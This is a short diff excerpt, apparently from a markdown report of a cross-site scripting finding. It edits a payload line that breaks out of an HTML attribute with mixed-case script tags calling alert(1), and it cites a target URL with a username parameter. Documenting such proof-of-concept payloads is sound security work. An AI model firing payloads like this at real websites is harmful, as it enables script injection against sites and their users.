@@ -56,7 +56,7 @@ https://media.pwnedbox.site/index.php/?username=x8scan1
 
 **Payload:**
 ```html
-hakama'"><><scRIpt>alert(1)</scRIpt>
+hakama'"<><scRIpt>alert(1)</scRIpt>
 ```
 
 **Crafted Request URL:**
